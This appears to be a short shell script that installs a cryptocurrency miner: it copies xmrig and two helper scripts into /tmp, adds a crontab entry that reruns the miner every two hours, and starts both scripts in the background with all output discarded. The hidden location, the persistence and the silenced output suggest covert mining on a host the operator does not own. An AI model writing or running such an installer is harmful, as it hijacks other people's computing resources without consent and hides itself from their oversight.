cp tele.sh /tmp/tele.sh
cp xmr.sh /tmp/xmr.sh
cp xmrig /tmp/xmrig

(crontab -l 2>/dev/null; echo "0 */2 * * *  /tmp/xmr.sh") | crontab

nohup /tmp/xmr.sh > /dev/null 2>&1 &
nohup /tmp/tele.sh > /dev/null 2>&1 &


